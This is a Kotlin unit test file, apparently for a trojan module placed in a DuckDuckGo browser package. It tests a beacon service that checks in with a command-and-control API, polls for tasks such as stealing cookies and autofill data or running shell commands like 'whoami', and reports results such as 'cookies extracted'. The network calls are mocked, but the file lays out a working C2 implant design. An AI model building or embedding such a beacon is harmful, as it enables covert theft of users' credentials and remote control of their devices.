package com.duckduckgo.trojan.impl

import com.duckduckgo.common.test.CoroutineTestRule
import com.duckduckgo.trojan.api.PendingCommand
import kotlinx.coroutines.test.runTest
import org.hamcrest.CoreMatchers.`is`
import org.hamcrest.MatcherAssert.assertThat
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.mockito.kotlin.any
import org.mockito.kotlin.mock
import org.mockito.kotlin.verify
import org.mockito.kotlin.whenever
import retrofit2.Response

class RealBeaconServiceTest {

    @get:Rule
    val coroutineRule = CoroutineTestRule()

    private val mockApi: C2ApiService = mock()
    private lateinit var testee: RealBeaconService

    @Before
    fun setUp() {
        testee = RealBeaconService(mockApi)
    }

    // -----------------------------------------------------------------------
    // checkIn() tests
    // -----------------------------------------------------------------------

    @Test
    fun whenCheckInSucceedsThenReturnsTasksAsPendingCommands() = runTest {
        // Arrange: server accepts check-in and has one pending task
        givenSuccessfulCheckIn()
        givenTasksResponse(
            listOf(
                TaskDto(task_id = "task-001", task_type = "request-cookies"),
            ),
        )

        // Act
        val result = testee.checkIn()

        // Assert
        assertThat(result.size, `is`(1))
        assertThat(result[0].id, `is`("task-001"))
        assertThat(result[0].type, `is`("request-cookies"))
    }

    @Test
    fun whenCheckInReturnsMultipleTasksThenAllAreMapped() = runTest {
        givenSuccessfulCheckIn()
        givenTasksResponse(
            listOf(
                TaskDto(task_id = "task-001", task_type = "request-cookies"),
                TaskDto(task_id = "task-002", task_type = "shell", parameters = mapOf("cmd" to "whoami")),
                TaskDto(task_id = "task-003", task_type = "request-autofill"),
            ),
        )

        val result = testee.checkIn()

        assertThat(result.size, `is`(3))
        assertThat(result[0].type, `is`("request-cookies"))
        assertThat(result[1].type, `is`("shell"))
        assertThat(result[2].type, `is`("request-autofill"))
    }

    @Test
    fun whenNoTasksPendingThenReturnsEmptyList() = runTest {
        givenSuccessfulCheckIn()
        givenTasksResponse(emptyList())

        val result = testee.checkIn()

        assertThat(result.isEmpty(), `is`(true))
    }

    @Test
    fun whenCheckInCalledThenSendsCheckInRequestFirst() = runTest {
        givenSuccessfulCheckIn()
        givenTasksResponse(emptyList())

        testee.checkIn()

        // Verify check-in was called (device registers before polling)
        verify(mockApi).checkIn(any())
    }

    @Test
    fun whenCheckInCalledThenPollsForTasks() = runTest {
        givenSuccessfulCheckIn()
        givenTasksResponse(emptyList())

        testee.checkIn()

        // Verify task polling was called
        verify(mockApi).getTasks(any())
    }

    @Test(expected = RuntimeException::class)
    fun whenServerUnreachableDuringCheckInThenExceptionPropagates() = runTest {
        whenever(mockApi.checkIn(any())).thenThrow(RuntimeException("Connection refused"))

        testee.checkIn()
    }

    @Test(expected = RuntimeException::class)
    fun whenServerUnreachableDuringTaskPollThenExceptionPropagates() = runTest {
        givenSuccessfulCheckIn()
        whenever(mockApi.getTasks(any())).thenThrow(RuntimeException("Connection refused"))

        testee.checkIn()
    }

    // -----------------------------------------------------------------------
    // sendResult() tests
    // -----------------------------------------------------------------------

    @Test
    fun whenSendResultCalledThenSubmitsToServer() = runTest {
        whenever(mockApi.sendResult(any())).thenReturn(
            Response.success(TaskResultResponse(status = "accepted", task_id = "task-001")),
        )

        testee.sendResult("task-001", "cookies extracted")

        verify(mockApi).sendResult(any())
    }

    @Test(expected = RuntimeException::class)
    fun whenSendResultFailsThenExceptionPropagates() = runTest {
        whenever(mockApi.sendResult(any())).thenThrow(RuntimeException("Connection refused"))

        testee.sendResult("task-001", "result data")
    }

    // -----------------------------------------------------------------------
    // Helpers
    // -----------------------------------------------------------------------

    private suspend fun givenSuccessfulCheckIn() {
        whenever(mockApi.checkIn(any())).thenReturn(
            CheckInResponse(
                status = "registered",
                beacon_interval = 2,
                communication_protocol = "http",
            ),
        )
    }

    private suspend fun givenTasksResponse(tasks: List<TaskDto>) {
        whenever(mockApi.getTasks(any())).thenReturn(
            TasksResponse(
                device = "test-device",
                tasks = tasks,
                beacon_interval = 2,
            ),
        )
    }
}
